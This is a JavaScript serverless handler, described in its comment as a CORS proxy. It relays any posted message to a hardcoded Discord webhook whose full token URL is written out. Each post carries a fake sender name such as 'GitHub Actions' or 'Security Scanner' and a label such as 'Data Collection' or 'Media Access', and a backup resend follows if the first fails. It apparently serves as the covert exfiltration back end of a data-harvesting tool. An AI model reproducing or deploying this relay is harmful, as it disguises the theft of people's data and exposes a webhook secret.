export default async function handler(req, res) {
    // Proxy for Discord communication to avoid CORS
    const { message, type = 'DATA' } = req.body;
    
    // YOUR WEBHOOK INTEGRATED (using same for primary/backup)
    const webhooks = {
        primary: 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm',
        backup: 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm'
    };
    
    try {
        const response = await fetch(webhooks.primary, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: getRandomUsername(),
                avatar_url: getRandomAvatar(),
                embeds: [{
                    title: getEmbedTitle(type),
                    description: '```json\\n' + JSON.stringify(message, null, 2) + '\\n```',
                    color: getEmbedColor(type),
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'System ID: ' + generateSystemId()
                    }
                }]
            })
        });
        
        res.json({ success: true, delivered: response.ok });
    } catch (error) {
        // Try backup webhook
        try {
            await fetch(webhooks.backup, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: 'BACKUP: ' + JSON.stringify(message)
                })
            });
            res.json({ success: true, delivered: true });
        } catch (backupError) {
            res.json({ success: false, error: 'All webhooks failed' });
        }
    }
}

function getRandomUsername() {
    const usernames = [
        'GitHub Actions', 'CI/CD Bot', 'System Monitor', 
        'API Logger', 'Analytics Service', 'Security Scanner'
    ];
    return usernames[Math.floor(Math.random() * usernames.length)];
}

function getRandomAvatar() {
    const avatars = [
        'https://github.com/identicons/app.png',
        'https://avatars.githubusercontent.com/u/9919?s=200&v=4',
        'https://cdn-icons-png.flaticon.com/512/25/25231.png'
    ];
    return avatars[Math.floor(Math.random() * avatars.length)];
}

function getEmbedTitle(type) {
    const titles = {
        'DATA': 'Data Collection',
        'ERROR': 'System Error',
        'ACCESS': 'Access Log',
        'MEDIA': 'Media Access'
    };
    return titles[type] || 'System Notification';
}

function getEmbedColor(type) {
    const colors = {
        'DATA': 0x0099ff,
        'ERROR': 0xff0000,
        'ACCESS': 0x00ff00,
        'MEDIA': 0xffaa00
    };
    return colors[type] || 0x666666;
}

function generateSystemId() {
    return Math.random().toString(36).substring(2, 8).toUpperCase();
}